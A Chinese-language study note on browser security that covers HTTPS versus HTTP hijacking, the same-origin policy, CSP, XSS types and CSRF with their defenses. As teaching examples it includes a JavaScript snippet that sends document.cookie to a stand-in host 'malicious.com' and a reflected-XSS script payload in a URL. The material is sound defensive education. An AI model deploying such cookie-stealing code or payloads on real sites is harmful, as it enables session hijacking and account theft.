### why HTTPS
页面上弹出来一些广告，广告的域名是不同的，是因为网站被运营商劫持了，它往你的html里面注入了一段广告的html。
劫持也叫http劫持只发生在http连接上，而https的连接是没这个问题的，基本只要打开的是https的网页都不会被注入广告。因为传输的数据都是加密的，中间人收到的是一串无法解密的文本，它也不知道怎么篡改。
因为如果是http连接你的数据在网络上都是明文传输的，包括你的密码等敏感信息，你和服务器之间经过的路由都可以嗅探到你的数据，可以做些修改如嵌入一个广告，做一些破坏，或者只单纯的抓取信息如邮件内容、账号密码等。
https升级后的问题是：加密和解密需要占用更多的CPU，并且加密后的数据会变大，但是据笔者观察加上gzip压缩之后，https传输的内容大小几乎和http一样。除了正常的tcp连接之外，还要建立ssl连接，这个时间一般在0.3s ~ 0.5s左右，这个是需要付出点代价的

### 网络安全
如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。
具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。

**第一个，DOM 层面**。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。

**第二个，数据层面。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据**。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。

**第三个，网络层面**。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。

1. 页面中可以嵌入第三方资源

而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。

```js
function onClick(){
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()
```

以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。

### CSP(Content-Security-Policy)
` Content-Security-Policy: default-src 'self' `

2. 跨域资源共享和跨文档消息机制
在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。


### 什么是 XSS 攻击
XSS 全称是 `Cross Site Scripting`。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。
如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情

- 可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
- 可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。
- 可以通过修改 DOM伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。
- 还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。


### 主要有存储型 XSS 攻击、反射型 XSS 攻击和基于 DOM 的 XSS 攻击三种方式来注入恶意脚本。
1. 存储型 XSS 攻击

    - 首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；
    - 然后用户向网站请求包含了恶意 JavaScript 脚本的页面；
    - 当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。
2. 反射型 XSS 攻击
但当打开http://localhost:3000/?xss=<script>alert('你被xss攻击了')</script>这段 URL 时
我们会发现用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。

3. 基于 DOM 的 XSS 攻击
基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据

### 如何阻止 XSS 攻击
1. 服务器对输入脚本进行过滤或转码
code:<script>alert('你被 xss 攻击了')</script>
2. 充分利用 CSP
- 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
- 禁止向第三方域提交数据，这样用户数据也不会外泄；
- 禁止执行内联脚本和未授权的脚本；
还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。
3. 使用 HttpOnly 属性


### CSRF攻击：陌生链接不要随便点
首先 David 发起登录 Gmail 邮箱请求，然后 Gmail 服务器返回一些登录状态给 David 的浏览器，这些信息包括了 Cookie、Session 等，这样在 David 的浏览器中，Gmail 邮箱就处于登录状态了。
接着黑客通过各种手段引诱 David 去打开他的链接，比如 hacker.com，然后在 hacker.com 页面中，黑客编写好了一个邮件过滤器，并通过 Gmail 提供的 HTTP 设置接口设置好了新的邮件过滤功能，该过滤器会将 David 所有的邮件都转发到黑客的邮箱中。
最后的事情就很简单了，因为有了 David 的邮件内容，所以黑客就可以去域名服务商那边重置 David 域名账户的密码，重置好密码之后，就可以将其转出到黑客的账户了。


### 什么是 CSRF 攻击
CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事

#### CSRF流程

1. 受害者登录a.com，并保留了登录凭证（Cookie）。
2. 攻击者引诱受害者访问了b.com。
3. b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。
4. a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
5. a.com以受害者的名义执行了act=xx。

1. 自动发起 Get 请求
黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 极客币就被转移到黑客的账户上去了。
2. 自动发起 POST 请求
除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求
3. 引诱用户点击链接
除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接


### 如何防止 CSRF 攻击
1. 充分利用好 Cookie 的 SameSite 属性
通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有如下区别：

- 如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器；
- 如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。
而我们要聊的 Cookie 中的 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。

SameSite 选项通常有 Strict、Lax 和 None 三个值。

- Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。
- Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。
- 而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。


2. 验证请求的来源站点
Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。
但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了Origin 属性，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性。
Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。

3. CSRF Token

第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。
第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。